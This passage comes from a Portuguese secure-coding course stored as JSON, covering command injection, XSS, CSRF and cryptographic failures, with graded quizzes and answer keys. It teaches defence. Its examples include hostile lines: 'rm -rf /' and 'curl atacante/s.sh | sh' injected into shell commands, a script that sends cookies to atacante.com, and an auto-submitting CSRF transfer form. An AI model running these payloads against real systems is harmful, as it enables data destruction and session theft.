                        "statement": "Uma aplicação usa um ORM que parametriza os valores, mas, para ordenar o resultado, o desenvolvedor concatena a entrada do usuário num trecho `ORDER BY ` + req.query.ordem. Por que ainda há risco de SQL injection?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Não há risco: usar um ORM elimina qualquer chance de SQL injection.",
                                "isCorrect": false
                            },
                            {
                                "text": "A parametrização protege valores, não identificadores concatenados.",
                                "isCorrect": true
                            },
                            {
                                "text": "O risco desaparece se a conexão entre app e banco usar HTTPS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Basta transformar o valor em letras maiúsculas antes de concatenar.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Command Injection: quando o servidor executa o comando do atacante",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Command Injection: quando o servidor executa o comando do atacante\n\nÀs vezes a aplicação precisa pedir algo ao **sistema operacional**: pingar um host, converter uma imagem, gerar um PDF, compactar um arquivo. Para isso, é comum montar uma **linha de comando** e mandar o shell executar. A **injeção de comando de SO** (command injection) acontece quando dados do usuário entram nessa linha por **concatenação** e conseguem emendar **comandos extras**.\n\nÉ a mesma doença do SQL injection, agora diante de um interpretador ainda mais poderoso: o **shell**. E o prêmio para o atacante costuma ser o mais alto de todos, a **execução remota de código** (RCE) no seu servidor."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL (Node): a entrada e concatenada na linha de comando\nconst { exec } = require(\"node:child_process\");\n\napp.get(\"/ping\", (req, res) => {\n  const host = req.query.host;              // esperado: \"8.8.8.8\"\n  exec(\"ping -c 1 \" + host, (err, stdout) => res.send(stdout));\n});\n\n// exec() entrega a string INTEIRA para o shell interpretar.\n// Se host = \"8.8.8.8; rm -rf /\"  o shell roda DOIS comandos:\n//   ping -c 1 8.8.8.8   E DEPOIS   rm -rf /\n//\n// Em Python o erro equivalente:\n// os.system(\"ping -c 1 \" + host)   # host = \"x; curl atacante/s.sh | sh\"  -> RCE"
                    },
                    {
                        "type": "text",
                        "value": "## Por que é tão grave (e por que \"escapar\" não basta)\n\nUma vez que executa comandos no servidor, o atacante pode ler segredos, baixar e rodar programas, pivotar para a rede interna, apagar tudo. Na prática, é **controle da máquina**.\n\nO shell tem *muitos* caracteres que separam ou combinam comandos, e tentar bloquear todos na unha (blacklist) é uma corrida perdida:\n\n- `;` executa o próximo comando;\n- `&&` e `||` encadeiam conforme o sucesso ou a falha;\n- `|` manda a saída de um comando para a entrada de outro;\n- `$(...)` e crases executam um comando e substituem pelo resultado;\n- `>` e `<` redirecionam arquivos.\n\nA correção certa não é caçar caractere perigoso: é **não passar pelo shell** e fazer o programa receber a entrada como **argumento**, não como parte de um comando."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO (Node): execFile/spawn recebem o programa e os ARGUMENTOS a parte,\n// sem shell - os metacaracteres viram texto comum, sem poder de comando.\nconst { execFile } = require(\"node:child_process\");\n\napp.get(\"/ping\", (req, res) => {\n  const host = req.query.host;\n  // allow-list: aceite so o formato esperado (defesa extra)\n  if (!/^[a-zA-Z0-9.-]+$/.test(host)) return res.status(400).send(\"host invalido\");\n\n  execFile(\"ping\", [\"-c\", \"1\", host], (err, stdout) => res.send(stdout));\n  // \"8.8.8.8; rm -rf /\" seria passado como UM argumento literal para o ping,\n  // que apenas falha em resolver esse 'host' - nada e executado.\n});\n\n// Em Python: lista de argumentos + shell=False (que ja e o padrao)\n// subprocess.run([\"ping\", \"-c\", \"1\", host], shell=False, check=True)"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Injecao\",\"Onde ocorre\",\"Como o dado vira 'codigo'\",\"Defesa\"],[\"Command Injection\",\"Shell do SO\",\"Emenda comandos na linha\",\"Argumentos separados, sem shell\"],[\"NoSQL Injection\",\"MongoDB e afins\",\"Vira operador ($gt, $ne...)\",\"Validar tipos / parametrizar\"],[\"LDAP Injection\",\"Diretorio LDAP\",\"Altera o filtro de busca\",\"Escape do filtro\"],[\"Path Traversal\",\"Sistema de arquivos\",\"../ escapa da pasta permitida\",\"Normalizar e restringir o caminho\"],[\"Template Injection\",\"Motor de templates\",\"Expressao e avaliada no servidor\",\"Nao montar template com entrada\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "Contra injeção de comando, a regra de ouro é: nunca monte uma linha de comando com concatenação e nunca chame o shell com dados do usuário. Use APIs que recebem o programa e seus argumentos separadamente; assim o dado não tem como virar comando."
                    }
                ],
                "questions": [
                    {
                        "statement": "No pior caso, o que um ataque de command injection dá ao atacante?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "A capacidade de executar comandos no servidor da aplicação.",
                                "isCorrect": true
                            },
                            {
                                "text": "Apenas mudar as cores da página que é exibida ao usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ler os cookies salvos no navegador de outro usuário logado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Somente deixar o site um pouco mais lento por alguns segundos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que  exec(\"ping -c 1 \" + host)  é perigoso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Porque o comando ping não existe na maioria dos servidores.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a string toda vai ao shell, que emenda comandos extras.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque a função exec sempre roda bem mais devagar que as outras.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o valor do host precisa ser sempre um número válido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Na entrada  8.8.8.8; rm -rf /  passada a um comando montado por concatenação, qual caractere faz o shell executar um segundo comando?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O ponto (.).",
                                "isCorrect": false
                            },
                            {
                                "text": "O espaço em branco.",
                                "isCorrect": false
                            },
                            {
                                "text": "O ponto e vírgula (;).",
                                "isCorrect": true
                            },
                            {
                                "text": "O hífen (-).",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual chamada executa o ping com segurança, sem passar pelo shell?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "exec(\"ping -c 1 \" + host)",
                                "isCorrect": false
                            },
                            {
                                "text": "exec(\"ping -c 1 \" + host.replace(\";\", \"\"))",
                                "isCorrect": false
                            },
                            {
                                "text": "execFile(\"ping\", [\"-c\", \"1\", host])",
                                "isCorrect": true
                            },
                            {
                                "text": "os.system(\"ping -c 1 \" + host)",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um desenvolvedor troca exec por execFile, mas escreve:  execFile(\"sh\", [\"-c\", \"ping -c 1 \" + host]).  Isso corrige a vulnerabilidade?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Não: trocar exec por execFile sozinho já elimina o risco de injeção.",
                                "isCorrect": false
                            },
                            {
                                "text": "Sim: sh -c reintroduz o shell, permitindo emendar comandos de novo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Não: um array de argumentos sempre bloqueia injeção, mesmo com sh -c.",
                                "isCorrect": false
                            },
                            {
                                "text": "Sim, só volta a ser um problema quando o servidor roda Windows.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "XSS: executando o script do atacante no navegador da vítima",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# XSS: executando o script do atacante no navegador da vítima\n\nO **cross-site scripting** (XSS) é a injeção que mira o **navegador**. Em vez de enganar o banco ou o shell, o atacante consegue que **o navegador de outra pessoa** execute o **JavaScript dele**, dentro do seu site. Como esse script roda com a sessão da vítima, ele pode **roubar cookies e tokens**, **agir em nome do usuário**, ler o que está na tela ou desfigurar a página.\n\nExistem três tipos, pela forma como a carga chega até a vítima:\n\n- **Refletido**: a carga vai na **requisição** (tipicamente na URL) e volta na resposta. A vítima precisa abrir um **link** preparado.\n- **Armazenado**: a carga é **salva no servidor** (um comentário, um perfil) e atinge **todo mundo** que vê aquele conteúdo depois. É o mais perigoso.\n- **Baseado em DOM**: a falha está no **JavaScript do cliente**, que pega um dado (por exemplo, da URL) e o joga no DOM sem tratar. Muitas vezes o servidor nem chega a ver a carga."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL (refletido): devolve a busca dentro do HTML sem tratamento\napp.get(\"/busca\", (req, res) => {\n  const termo = req.query.q;\n  res.send(\"<h1>Resultados para: \" + termo + \"</h1>\");\n});\n// Link malicioso enviado a vitima:\n// /busca?q=<script>fetch('https://atacante.com/c?'+document.cookie)</script>\n// O navegador executa o <script> e manda o cookie de sessao ao atacante.\n\n// VULNERAVEL (baseado em DOM): entrada da URL vai direto ao innerHTML\nconst alvo = document.getElementById(\"saudacao\");\nalvo.innerHTML = \"Ola, \" + decodeURIComponent(location.hash.slice(1));\n// #<img src=x onerror=alert(document.cookie)>  dispara no navegador da vitima."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Tipo de XSS\",\"Onde a carga vive\",\"Como chega a vitima\",\"Alcance\"],[\"Refletido\",\"Na requisicao (URL)\",\"Vitima abre um link preparado\",\"Um alvo por vez\"],[\"Armazenado\",\"No banco do servidor\",\"Qualquer um que veja o conteudo\",\"Muitas vitimas\"],[\"Baseado em DOM\",\"No JavaScript do cliente\",\"Link/URL manipulada; servidor pode nem ver\",\"Depende do fluxo no cliente\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Como se defender: tratar dado como texto, sempre\n\nA regra central é a mesma da injeção em geral: **nunca deixe a entrada do usuário ser interpretada como código**, aqui, como HTML ou JavaScript.\n\n- **Output encoding contextual**: ao inserir um dado no HTML, converta os caracteres especiais (`<`, `>`, `&`, aspas) em entidades. Assim `<script>` aparece como **texto**, não como tag.\n- **Prefira APIs de texto**: no cliente, use `textContent` em vez de `innerHTML`; ele nunca interpreta o conteúdo como HTML.\n- **Aproveite o auto-escape dos frameworks**: React, Vue e Angular escapam por padrão. O perigo mora nas saídas de emergência, `dangerouslySetInnerHTML` (React) e `v-html` (Vue), que só devem receber conteúdo confiável.\n- **Sanitize HTML rico**: quando você *precisa* aceitar HTML (um editor de texto, por exemplo), passe por uma biblioteca como o **DOMPurify**, que remove scripts e atributos perigosos.\n\nE, como **defesa em profundidade**, duas redes de segurança do lado do servidor: a **Content Security Policy (CSP)**, que instrui o navegador a **não executar scripts inline nem de origens não confiáveis**, e o cookie de sessão marcado como **HttpOnly**, que o **JavaScript não consegue ler**, então, mesmo com um XSS, o cookie não vaza tão fácil."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO 1: trate como TEXTO, nao como HTML\nalvo.textContent = \"Ola, \" + nome;   // <script> aparece como texto, nao executa\n\n// SEGURO 2: no servidor, faca output encoding para o contexto HTML\nfunction escaparHtml(s) {\n  return s.replace(/&/g, \"&amp;\").replace(/</g, \"&lt;\")\n          .replace(/>/g, \"&gt;\").replace(/\"/g, \"&quot;\").replace(/'/g, \"&#39;\");\n}\nres.send(\"<h1>Resultados para: \" + escaparHtml(termo) + \"</h1>\");\n\n// SEGURO 3: para HTML rico, sanitize (nunca confie no innerHTML cru)\nelemento.innerHTML = DOMPurify.sanitize(htmlDoUsuario);\n\n// DEFESA EM PROFUNDIDADE (servidor):\nres.setHeader(\"Content-Security-Policy\", \"default-src 'self'; script-src 'self'\");\nres.cookie(\"session\", token, { httpOnly: true, secure: true, sameSite: \"lax\" });"
                    },
                    {
                        "type": "quote",
                        "value": "XSS se resolve tratando toda entrada como texto e fazendo output encoding no contexto certo; os frameworks ajudam ao escapar por padrão. Por cima disso, CSP e cookies HttpOnly funcionam como rede de segurança para o dia em que algo escapar."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que um XSS bem-sucedido permite ao atacante?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Executar JavaScript no navegador da vítima e roubar a sessão.",
                                "isCorrect": true
                            },
                            {
                                "text": "Apagar diretamente todas as tabelas inteiras do banco de dados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Desligar fisicamente o servidor onde a aplicação roda.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ler qualquer arquivo do sistema operacional do servidor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual tipo de XSS fica salvo no servidor e atinge todos que veem aquele conteúdo depois?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Refletido (reflected).",
                                "isCorrect": false
                            },
                            {
                                "text": "Armazenado (stored).",
                                "isCorrect": true
                            },
                            {
                                "text": "Baseado em DOM.",
                                "isCorrect": false
                            },
                            {
                                "text": "Temporário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O código  alvo.innerHTML = \"Ola, \" + nomeDaURL  insere um valor da URL no DOM e é vulnerável a XSS baseado em DOM. Qual correção resolve mantendo um texto simples?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Trocar innerHTML por outerHTML, que já é imune a XSS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Usar alvo.textContent, que insere o valor como texto puro.",
                                "isCorrect": true
                            },
                            {
                                "text": "Envolver a atribuição num try/catch para capturar o script.",
                                "isCorrect": false
                            },
                            {
                                "text": "Limitar o tamanho da string recebida a cem caracteres.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é o papel da Content Security Policy (CSP) no combate ao XSS?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Criptografar todos os cookies para que não possam ser roubados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Validar todas as consultas SQL antes de chegarem ao banco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Barrar no navegador scripts inline e de fontes não confiáveis.",
                                "isCorrect": true
                            },
                            {
                                "text": "Comprimir o conteúdo HTML para a página carregar mais rápido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma aplicação React exibe comentários de usuários com dangerouslySetInnerHTML, 'porque o React já é seguro por padrão'. Qual é o problema e a correção?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Não há problema: o React sanitiza automaticamente esse conteúdo também.",
                                "isCorrect": false
                            },
                            {
                                "text": "dangerouslySetInnerHTML ignora o auto-escape; o certo é sanitizar antes.",
                                "isCorrect": true
                            },
                            {
                                "text": "O problema é de performance; a correção é memorizar o componente.",
                                "isCorrect": false
                            },
                            {
                                "text": "Basta usar HTTPS para que o HTML injetado não seja executado.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "CSRF: quando o navegador da vítima é usado contra ela",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# CSRF: quando o navegador da vítima é usado contra ela\n\nO **cross-site request forgery** (CSRF, \"requisição forjada entre sites\") explora um comportamento normal do navegador: ao chamar um site, ele **anexa automaticamente os cookies** daquele domínio, inclusive o cookie de **sessão**. Isso vale para **qualquer** requisição ao domínio, mesmo que ela tenha partido de **outra página**.\n\nO ataque: a vítima está **logada** no seu site (banco.com, digamos) e, noutra aba, abre uma página maliciosa. Essa página dispara, escondida, uma requisição para banco.com. O navegador, obediente, **anexa o cookie de sessão**, e o servidor executa a ação **como se fosse a vítima**. O atacante não rouba a sessão; ele **pega carona** nela.\n\nRepare a diferença para o XSS: no XSS o atacante roda script **dentro do seu site**; no CSRF ele nem precisa disso, só induz o navegador a **enviar uma requisição**."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: acao que muda estado, autenticada SO pelo cookie de sessao\napp.post(\"/transferir\", (req, res) => {\n  // o navegador anexa o cookie de sessao em qualquer requisicao ao dominio\n  transferir(req.session.userId, req.body.para, req.body.valor);\n  res.send(\"ok\");\n});\n\n<!-- Pagina no site do atacante. Basta a vitima (logada) abri-la: -->\n<form action=\"https://banco.com/transferir\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"para\" value=\"atacante\">\n  <input type=\"hidden\" name=\"valor\" value=\"1000\">\n</form>\n<script>document.getElementById(\"f\").submit();</script>\n<!-- O form envia sozinho; o cookie de sessao da vitima vai junto. -->"
                    },
                    {
                        "type": "text",
                        "value": "## O que torna um endpoint vulnerável\n\nTrês ingredientes deixam uma rota exposta a CSRF:\n\n- **Muda estado**: transfere dinheiro, troca e-mail/senha, apaga algo, faz uma compra.\n- **Autentica só por cookie**: a credencial é enviada **automaticamente** pelo navegador (a chamada \"autoridade ambiente\" do cookie).\n- **É previsível**: o atacante consegue montar a requisição sem precisar de nenhum valor secreto.\n\nO impacto é o atacante **realizar ações em nome da vítima**: mudar o e-mail de recuperação para sequestrar a conta, transferir valores, alterar configurações. Note que o atacante em geral **não vê a resposta** (a política de mesma origem protege a leitura); o dano está no **efeito colateral** da requisição."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO 1: token anti-CSRF (synchronizer token pattern)\n// O servidor gera um valor aleatorio por sessao, embute no formulario\n// e exige ele de volta na submissao. O site do atacante nao conhece o token.\napp.get(\"/form\", (req, res) => {\n  const token = gerarTokenCsrf(req.session);   // aleatorio, guardado na sessao\n  res.send('<form method=\"POST\" action=\"/transferir\">' +\n           '<input type=\"hidden\" name=\"_csrf\" value=\"' + token + '\">' +\n           '  ...campos... </form>');\n});\n\napp.post(\"/transferir\", (req, res) => {\n  if (req.body._csrf !== req.session.csrfToken) {\n    return res.status(403).send(\"token CSRF invalido\");\n  }\n  transferir(req.session.userId, req.body.para, req.body.valor);\n  res.send(\"ok\");\n});\n\n// SEGURO 2: cookie SameSite - o navegador NAO envia o cookie em requisicoes\n// vindas de outro site (cross-site). Corta a raiz do CSRF.\nres.cookie(\"session\", token, { httpOnly: true, secure: true, sameSite: \"lax\" });"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Defesa\",\"Como funciona\",\"Observacao\"],[\"Token anti-CSRF\",\"Valor secreto por sessao exigido na submissao\",\"Padrao robusto; o atacante nao o conhece\"],[\"Cookie SameSite=Lax/Strict\",\"Navegador nao envia o cookie cross-site\",\"Otima base; Lax ja barra POST cross-site\"],[\"Conferir Origin/Referer\",\"Rejeita requisicoes de outra origem\",\"Camada extra de checagem\"],[\"Somente HTTPS\",\"Protege o trafego em transito\",\"NAO defende de CSRF\"],[\"Somente CORS\",\"Controla leitura cross-origin por JS\",\"NAO impede o envio da requisicao\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "Toda ação que muda estado precisa provar que partiu do SEU site: use token anti-CSRF e/ou cookies SameSite. O cookie de sessão sozinho prova quem é o usuário, mas não prova que foi ele quem quis a ação."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que é um ataque de CSRF (cross-site request forgery)?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Fazer o navegador da vítima logada enviar uma requisição usando o cookie dela.",
                                "isCorrect": true
                            },
                            {
                                "text": "Injetar um script que executa no navegador da vítima, dentro do site legítimo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Descobrir a senha da vítima por força bruta prolongada.",
                                "isCorrect": false
                            },
                            {
                                "text": "Concatenar dados do usuário direto numa consulta SQL.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual atributo de cookie faz o navegador não enviá-lo em requisições vindas de outro site, ajudando contra CSRF?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "HttpOnly.",
                                "isCorrect": false
                            },
                            {
                                "text": "SameSite.",
                                "isCorrect": true
                            },
                            {
                                "text": "Secure.",
                                "isCorrect": false
                            },
                            {
                                "text": "Path.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "No exemplo, a rota POST /transferir confia apenas no cookie de sessão. Por que o formulário hospedado no site do atacante consegue efetuar a transferência?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Porque o formulário do atacante consegue ler a senha da vítima direto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o navegador anexa o cookie de sessão sozinho a cada requisição.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque o atacante conseguiu adivinhar o token anti-CSRF correto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o CORS configurado no banco liberou o domínio do atacante.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Como um token anti-CSRF (synchronizer token) impede o ataque?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Ele criptografa por completo o cookie de sessão da vítima atual.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ele exige um valor aleatório por sessão, desconhecido do atacante.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ele impede qualquer JavaScript de rodar na página carregada.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ele obriga o uso de HTTPS em todas as rotas da aplicação inteira.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma equipe 'protege' as rotas contra CSRF apenas com CORS restritivo e HTTPS, mas os ataques continuam funcionando. Por quê?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Porque faltou marcar o cookie como HttpOnly; é a única defesa real contra CSRF que existe.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o CORS configurado precisa liberar o próprio domínio do atacante para funcionar direito.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque CORS só controla a leitura da resposta por JS; não impede o envio. Falta token ou SameSite.",
                                "isCorrect": true
                            },
                            {
                                "text": "Não deveria estar caindo em CSRF nesse caso; é provavelmente um falso positivo do teste.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 4 - Falhas criptográficas e proteção de dados (A04)",
        "aulas": [
            {
                "titulo": "Falhas criptográficas e dados sensíveis",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Falhas criptográficas e dados sensíveis\n\nBem-vindo ao módulo sobre a categoria **A04:2025 - Cryptographic Failures** (Falhas criptográficas) do OWASP Top 10. Até a edição de 2017 essa categoria se chamava *Sensitive Data Exposure* (Exposição de dados sensíveis), mas o nome mudou por um bom motivo: a **exposição** dos dados é o **sintoma**; a **causa raiz** quase sempre é uma **falha de criptografia**, seja por não usá-la, usá-la mal ou usar algoritmos fracos.\n\nNeste módulo o foco é a **confidencialidade** e a **integridade** de dados sensíveis em dois momentos: **em trânsito** (viajando pela rede) e **em repouso** (guardados no banco, em arquivos e backups). Vamos do conceito ao código, sempre com o par **inseguro x seguro** lado a lado."
                    },
                    {
                        "type": "text",
                        "value": "## Que dados são sensíveis?\n\nAntes de proteger, você precisa saber **o que** proteger. Um erro comum é cifrar o que não importa e deixar exposto o que importa. Dados sensíveis são todos aqueles que causam dano a alguém (ou à empresa) se vazarem, forem alterados ou caírem nas mãos de terceiros. Os principais grupos:\n\n- **Credenciais e segredos**: senhas, tokens de sessão, chaves de API, chaves privadas.\n- **Dados pessoais (PII)**: nome completo, CPF, e-mail, telefone, endereço.\n- **Dados financeiros**: números de cartão, dados bancários.\n- **Dados de saúde** e outros dados sensíveis por lei (LGPD e GDPR tratam esses com regras mais rígidas).\n\nO primeiro passo prático de AppSec é a **classificação de dados**: mapear o que a aplicação coleta e o quão sensível é cada campo. É isso que decide, mais à frente, o que precisa ser cifrado, o que precisa ser hasheado e o que nem deveria ser guardado."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Categoria\",\"Exemplos\",\"Risco se vazar\"],[\"Credenciais\",\"Senha, token de sessão, chave de API\",\"Sequestro de conta, acesso total ao sistema\"],[\"Dados pessoais (PII)\",\"CPF, e-mail, telefone, endereço\",\"Fraude, golpes direcionados, multa por LGPD\"],[\"Financeiros\",\"Número de cartão, dados bancários\",\"Prejuízo financeiro direto\"],[\"Saúde\",\"Diagnósticos, exames\",\"Constrangimento, discriminação, sanção legal\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Cifrar, hashear e codificar não são a mesma coisa\n\nEssa confusão é a origem de muitas falhas. São três operações parecidas, com propósitos totalmente diferentes:\n\n- **Codificar** (ex.: Base64) transforma dados em outro formato para **transporte**, não para segurança. É **reversível por qualquer um**, sem chave. Base64 **não protege nada**.\n- **Cifrar** (ex.: AES) embaralha os dados com uma **chave**; quem tem a chave **reverte** e lê o conteúdo. Serve para a **confidencialidade** de dados que você precisa recuperar depois.\n- **Hashear** (ex.: bcrypt) gera uma impressão digital de **mão única**: não dá para voltar ao valor original. Serve para **senhas** e para verificar **integridade**.\n\nGuarde a regra: se alguém diz que \"protegeu\" a senha com Base64, a senha está, na prática, **em texto plano**."
                    },
                    {
                        "type": "code",
                        "value": "// Isto NAO e seguranca: Base64 e apenas uma codificacao reversivel\nconst senha = \"segredo123\";\nconst codificada = Buffer.from(senha).toString(\"base64\"); // c2VncmVkbzEyMw==\n\n// qualquer pessoa reverte em uma linha, sem chave nenhuma:\nconst original = Buffer.from(codificada, \"base64\").toString(\"utf8\");\nconsole.log(original); // segredo123"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** A04 trata da **confidencialidade e integridade** de dados sensíveis. Primeiro **classifique** o que é sensível; depois proteja nos **dois estados**, em trânsito e em repouso. E nunca confunda **codificar** (Base64, sem segurança) com **cifrar** (com chave) ou **hashear** (mão única)."
                    }
                ],
                "questions": [
                    {
                        "statement": "A categoria A04:2025 do OWASP mudou de nome (antes era \"Sensitive Data Exposure\"). Qual é o raciocínio por trás da mudança?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "A exposição é o sintoma: a causa raiz quase sempre é falha na criptografia.",
                                "isCorrect": true
                            },
                            {
                                "text": "A exposição não é mais relevante, pois o HTTPS resolveria tudo sozinho.",
                                "isCorrect": false
                            },
                            {
                                "text": "A categoria passou a tratar só de senha, por ser o vazamento mais comum.",
                                "isCorrect": false
                            },
                            {
                                "text": "A criptografia saiu do Top 10 de 2025 por ser um problema já resolvido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual afirmação sobre Base64 está correta?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "É uma codificação reversível sem chave, não é segurança.",
                                "isCorrect": true
                            },
                            {
                                "text": "É uma cifra forte, desde que a chave fique em segredo.",
                                "isCorrect": false
                            },
                            {
                                "text": "É uma função de hash de mão única, própria para senhas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Protege dados em trânsito, o que dispensa o uso de HTTPS.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um sistema guarda o CPF para exibir de volta no perfil do usuário e guarda a senha para autenticar no login. Qual proteção é adequada para cada um?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "CPF: cifrar, pois precisa reaparecer depois. Senha: hashear, sem volta.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ambos com Base64, que já é suficiente para proteger dado sensível.",
                                "isCorrect": false
                            },
                            {
                                "text": "CPF: hashear direto. Senha: cifrar, para poder recuperá-la no login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ambos em texto plano, já que o próprio banco pede senha de acesso.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que a \"classificação de dados\" é o primeiro passo prático ao lidar com A04?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Só sabendo o que é sensível dá para decidir o que cifrar ou hashear.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque a LGPD exige cifrar todo dado com uma única chave padrão.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque classificar os dados substitui a necessidade de HTTPS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a classificação torna as consultas ao banco mais rápidas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um dev afirma que \"protegeu\" a senha antes de salvar no banco com este trecho:\n\nconst protegida = Buffer.from(senha).toString(\"base64\");\ndb.save({ senha: protegida });\n\nQual é o problema?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Base64 só codifica de forma reversível: a senha equivale a texto plano.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: o Base64 já é uma cifra forte o bastante para senhas longas.",
                                "isCorrect": false
                            },
                            {
                                "text": "O único problema real é o desempenho do Base64 com senhas longas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falta só somar um salt ao Base64 para isso ficar seguro de vez.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Dados em trânsito: HTTPS e TLS",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Dados em trânsito: HTTPS e TLS\n\nQuando um dado sai do navegador e vai até o servidor, ele **atravessa** uma porção de máquinas: o roteador do café, o Wi-Fi do aeroporto, o provedor de internet, roteadores no meio do caminho. Se a conexão for **HTTP puro**, tudo trafega em **texto plano**: qualquer um posicionado nesse caminho consegue **ler** e até **alterar** o conteúdo. É o clássico ataque **man-in-the-middle** (homem no meio).\n\nO **HTTPS** resolve isso: é o mesmo HTTP, mas dentro de um túnel cifrado chamado **TLS** (o antigo SSL). Por isso, para qualquer aplicação que trafegue dados sensíveis, HTTPS não é um extra: é **obrigatório**."
                    },
                    {
                        "type": "text",
                        "value": "## O que vaza sem HTTPS\n\nSem TLS, um atacante na mesma rede consegue capturar tudo que passa. Na prática, vazam:\n\n- **Credenciais**: usuário e senha digitados no login seguem legíveis.\n- **Cookies e tokens de sessão**: com o cookie de sessão em mãos, o atacante **se passa por você** sem saber a sua senha (sequestro de sessão).\n- **Dados pessoais**: qualquer PII enviada em formulários ou recebida nas respostas.\n\nE não é só leitura: como o HTTP não garante **integridade**, o atacante pode **injetar** conteúdo na resposta, um script malicioso, um banner de phishing, sem que o servidor perceba."
                    },
                    {
                        "type": "text",
